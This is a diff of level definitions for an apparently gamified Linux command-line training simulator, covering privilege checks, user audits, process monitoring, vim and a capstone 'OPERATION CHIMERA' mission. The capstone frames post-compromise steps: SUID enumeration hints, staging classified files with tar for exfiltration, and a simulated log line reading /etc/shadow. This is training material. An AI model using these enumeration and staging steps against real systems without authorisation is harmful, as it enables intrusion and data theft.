+                { id: 3, task: 'CHECK: Sudo Permissions', hint: '$ sudo -l', check: (cmd) => cmd.includes('sudo') && cmd.includes('-l') },
+                { id: 4, task: 'FIND: World-Writable', hint: '$ find / -perm -o+w -type f 2>/dev/null', check: (cmd) => cmd.includes('find') && cmd.includes('-perm') && cmd.includes('w') },
+                { id: 5, task: 'CHECK: Capabilities', hint: '$ getcap -r / 2>/dev/null', check: (cmd) => cmd.includes('getcap') },
+            ],
+
+            remoteHosts: null,
+        },
+
+        // ──────────────────────────────────────────────────────────
+        // CLH-027: User Management
+        // Theme: Managing user accounts post-compromise
+        // ──────────────────────────────────────────────────────────
+        'CLH-027': {
+            title: 'User Management',
+            description: 'Understand user management commands for persistence and cleanup.',
+            prerequisites: ['CLH-026'],
+            tier: 'CLI Wraith',
+            user: 'admin',
+            hostname: 'ADMIN-SRV',
+            startDir: '/home/admin',
+            allowedCommands: null,
+
+            filesystem: {
+                '/home/admin': {
+                    type: 'dir', perms: 'drwxr-xr-x', owner: 'admin', group: 'admin',
+                    children: ['user_audit', 'scripts', '.bashrc']
+                },
+                '/home/admin/user_audit': {
+                    type: 'dir', perms: 'drwxr-xr-x', owner: 'admin', group: 'admin',
+                    children: ['user_list.txt', 'group_memberships.txt']
+                },
+                '/home/admin/user_audit/user_list.txt': {
+                    type: 'file', perms: '-rw-r--r--', owner: 'admin', group: 'admin', size: 256,
+                    content: 'SYSTEM USERS\n============\nroot - System administrator\nadmin - Local admin\nbackdoor - SUSPICIOUS (created yesterday)\nguest - Disabled account\n'
+                },
+                '/home/admin/scripts': {
+                    type: 'dir', perms: 'drwxr-xr-x', owner: 'admin', group: 'admin',
+                    children: ['add_user.sh', 'audit_users.sh']
+                },
+            },
+
+            objectives: [
+                { id: 1, task: 'LIST: User Accounts', hint: '$ cat /etc/passwd | cut -d: -f1', check: (cmd) => cmd.includes('passwd') },
+                { id: 2, task: 'CHECK: User Details', hint: '$ getent passwd admin', check: (cmd) => cmd.includes('getent') || cmd.includes('finger') },
+                { id: 3, task: 'LIST: Group Memberships', hint: '$ groups admin (or cat /etc/group)', check: (cmd) => cmd.includes('groups') || (cmd.includes('cat') && cmd.includes('group')) },
+                { id: 4, task: 'CHECK: Password Status', hint: '$ passwd -S admin (or chage -l)', check: (cmd) => cmd.includes('passwd') && cmd.includes('-S') || cmd.includes('chage') },
+                { id: 5, task: 'AUDIT: Login Shells', hint: '$ cat /etc/shells && grep -v nologin /etc/passwd', check: (cmd) => cmd.includes('shells') || cmd.includes('nologin') },
+            ],
+
+            remoteHosts: null,
+        },
+
+        // ──────────────────────────────────────────────────────────
+        // CLH-028: System Monitoring
+        // Theme: Real-time system analysis
+        // ──────────────────────────────────────────────────────────
+        'CLH-028': {
+            title: 'System Monitoring',
+            description: 'Monitor system resources and detect anomalies.',
+            prerequisites: ['CLH-027'],
+            tier: 'CLI Ghost',
+            user: 'monitor',
+            hostname: 'OPS-CENTER',
+            startDir: '/home/monitor',
+            allowedCommands: null,
+
+            filesystem: {
+                '/home/monitor': {
+                    type: 'dir', perms: 'drwxr-xr-x', owner: 'monitor', group: 'monitor',
+                    children: ['dashboards', 'alerts', '.bashrc']
+                },
+                '/home/monitor/dashboards': {
+                    type: 'dir', perms: 'drwxr-xr-x', owner: 'monitor', group: 'monitor',
+                    children: ['cpu_history.log', 'memory_history.log']
+                },
+                '/home/monitor/alerts': {
+                    type: 'dir', perms: 'drwxr-xr-x', owner: 'monitor', group: 'monitor',
+                    children: ['high_cpu.txt', 'suspicious_proc.txt']
+                },
+                '/home/monitor/alerts/suspicious_proc.txt': {
+                    type: 'file', perms: '-rw-r--r--', owner: 'monitor', group: 'monitor', size: 256,
+                    content: 'SUSPICIOUS PROCESSES DETECTED\n==============================\nPID 6666 - xmrig (cryptominer) - 95% CPU\nPID 7777 - nc (netcat) - Persistent connection to 10.0.0.88\nPID 8888 - /tmp/.hidden/backdoor\n'
+                },
+            },
+
+            objectives: [
+                { id: 1, task: 'VIEW: Process List', hint: '$ ps aux', check: (cmd) => cmd.includes('ps') },
+                { id: 2, task: 'MONITOR: Real-time', hint: '$ top (or htop)', check: (cmd) => cmd.includes('top') },
+                { id: 3, task: 'CHECK: Memory Usage', hint: '$ free -h', check: (cmd) => cmd.includes('free') },
+                { id: 4, task: 'VIEW: Disk I/O', hint: '$ iostat (or vmstat)', check: (cmd) => cmd.includes('iostat') || cmd.includes('vmstat') || cmd.includes('iotop') },
+                { id: 5, task: 'FIND: High CPU Process', hint: '$ ps aux --sort=-%cpu | head', check: (cmd) => cmd.includes('ps') && (cmd.includes('sort') || cmd.includes('cpu')) },
+            ],
+
+            remoteHosts: null,
+        },
+
+        // ──────────────────────────────────────────────────────────
+        // CLH-029: Vim Essentials
+        // Theme: Essential editor skills for field operations
+        // ──────────────────────────────────────────────────────────
+        'CLH-029': {
+            title: 'Vim Essentials',
+            description: 'Master the essential text editor for field operations.',
+            prerequisites: ['CLH-028'],
+            tier: 'CLI Ghost',
+            user: 'operator',
+            hostname: 'FIELD-OPS',
+            startDir: '/home/operator',
+            allowedCommands: null,
+
+            filesystem: {
+                '/home/operator': {
+                    type: 'dir', perms: 'drwxr-xr-x', owner: 'operator', group: 'operator',
+                    children: ['training', 'configs', '.vimrc', '.bashrc']
+                },
+                '/home/operator/training': {
+                    type: 'dir', perms: 'drwxr-xr-x', owner: 'operator', group: 'operator',
+                    children: ['practice.txt', 'mission_template.txt']
+                },
+                '/home/operator/training/practice.txt': {
+                    type: 'file', perms: '-rw-r--r--', owner: 'operator', group: 'operator', size: 512,
+                    content: 'VIM PRACTICE FILE\n=================\nLine 1: The quick brown fox\nLine 2: jumps over the lazy dog\nLine 3: Pack my box with five dozen\nLine 4: liquor jugs\nLine 5: How vexingly quick daft zebras jump\n'
+                },
+                '/home/operator/.vimrc': {
+                    type: 'file', perms: '-rw-r--r--', owner: 'operator', group: 'operator', size: 256,
+                    content: '" Operator .vimrc\nset number\nset syntax=on\nset tabstop=4\nset autoindent\n'
+                },
+                '/home/operator/configs': {
+                    type: 'dir', perms: 'drwxr-xr-x', owner: 'operator', group: 'operator',
+                    children: ['network.conf', 'services.conf']
+                },
+            },
+
+            objectives: [
+                { id: 1, task: 'OPEN: Practice File', hint: '$ vim training/practice.txt', check: (cmd) => cmd.includes('vim') || cmd.includes('vi') },
+                { id: 2, task: 'READ: Vim Config', hint: '$ cat ~/.vimrc', check: (cmd) => cmd.includes('vimrc') },
+                { id: 3, task: 'LEARN: Vim Help', hint: '$ vim (then :help in vim)', check: (cmd) => cmd.includes('vim') },
+                { id: 4, task: 'EDIT: Config File', hint: '$ vim configs/network.conf', check: (cmd) => cmd.includes('vim') && cmd.includes('conf') },
+                { id: 5, task: 'PRACTICE: Navigation', hint: 'Open any file with vim', check: (cmd) => cmd.includes('vim') || cmd.includes('vi') },
+            ],
+
+            remoteHosts: null,
+        },
+
+        // ──────────────────────────────────────────────────────────
+        // CLH-030: OPERATION CHIMERA (Capstone)
+        // Theme: Final comprehensive mission
+        // ──────────────────────────────────────────────────────────
+        'CLH-030': {
+            title: 'OPERATION CHIMERA',
+            description: 'Final capstone mission. Apply all skills to compromise and exfiltrate from a high-value target.',
+            prerequisites: ['CLH-029'],
+            tier: 'CLI Ghost',
+            user: 'ghost',
+            hostname: 'CHIMERA',
+            startDir: '/home/ghost',
+            allowedCommands: null,
+
+            filesystem: {
+                '/home/ghost': {
+                    type: 'dir', perms: 'drwxr-xr-x', owner: 'ghost', group: 'ghost',
+                    children: ['mission', 'tools', 'staging', '.bashrc', '.ssh']
+                },
+                '/home/ghost/mission': {
+                    type: 'dir', perms: 'drwxr-xr-x', owner: 'ghost', group: 'ghost',
+                    children: ['briefing.txt', 'objectives.txt', 'contacts.txt']
+                },
+                '/home/ghost/mission/briefing.txt': {
+                    type: 'file', perms: '-rw-r--r--', owner: 'ghost', group: 'ghost', size: 1024,
+                    content: `OPERATION CHIMERA
+=================
+Classification: TOP SECRET//NOFORN
+
+SITUATION:
+You have gained initial access to CHIMERA network.
+Multiple high-value targets identified.
+
+MISSION:
+1. Establish persistence
+2. Escalate privileges
+3. Locate classified data
+4. Exfiltrate to handler
+
+TIME LIMIT: Mission critical
+HANDLER: SPECTER-1
+
+"Leave no trace. Trust no one."
+`
+                },
+                '/home/ghost/tools': {
+                    type: 'dir', perms: 'drwxr-xr-x', owner: 'ghost', group: 'ghost',
+                    children: ['scanner.sh', 'privesc.py', 'exfil.sh']
+                },
+                '/home/ghost/staging': {
+                    type: 'dir', perms: 'drwx------', owner: 'ghost', group: 'ghost',
+                    children: []
+                },
+                '/home/ghost/.ssh': {
+                    type: 'dir', perms: 'drwx------', owner: 'ghost', group: 'ghost',
+                    children: ['id_ed25519', 'id_ed25519.pub', 'known_hosts']
+                },
+                '/data/classified': {
+                    type: 'dir', perms: 'drwx------', owner: 'root', group: 'classified',
+                    children: ['project_chimera.pdf', 'asset_network.xlsx', 'operational_plans.docx']
+                },
+                '/data/classified/project_chimera.pdf': {
+                    type: 'file', perms: '-rw-------', owner: 'root', group: 'classified', size: 5242880,
+                    content: '[TOP SECRET//CHIMERA//NOFORN - Project documentation]'
+                },
+                '/var/log': {
+                    type: 'dir', perms: 'drwxr-xr-x', owner: 'root', group: 'root',
+                    children: ['auth.log', 'syslog', 'secure']
+                },
+                '/var/log/auth.log': {
+                    type: 'file', perms: '-rw-r-----', owner: 'root', group: 'adm', size: 4096,
+                    content: 'Jan 18 03:00:00 CHIMERA sshd[1234]: Accepted key for ghost from 10.0.0.1\nJan 18 03:00:15 CHIMERA sudo: ghost : TTY=pts/0 ; PWD=/home/ghost ; USER=root ; COMMAND=/bin/cat /etc/shadow\n'
+                },
+            },
+
+            objectives: [
+                { id: 1, task: 'RECON: Survey Environment', hint: 'ls -la && pwd && whoami', check: (cmd) => cmd.includes('ls') || cmd.includes('pwd') || cmd.includes('whoami') },
+                { id: 2, task: 'INTEL: Read Mission Briefing', hint: '$ cat mission/briefing.txt', check: (cmd) => cmd.includes('cat') && cmd.includes('briefing') },
+                { id: 3, task: 'ESCALATE: Find Privilege Path', hint: '$ find / -perm -4000 2>/dev/null', check: (cmd) => cmd.includes('find') && cmd.includes('-perm') },
+                { id: 4, task: 'LOCATE: Classified Data', hint: '$ find /data -name "*.pdf" 2>/dev/null', check: (cmd) => cmd.includes('find') && cmd.includes('data') },
+                { id: 5, task: 'EXFIL: Package Intel', hint: '$ tar -czf staging/chimera_intel.tar.gz /data/classified/', check: (cmd) => cmd.includes('tar') && cmd.includes('staging') },
             ],
 
             remoteHosts: null,
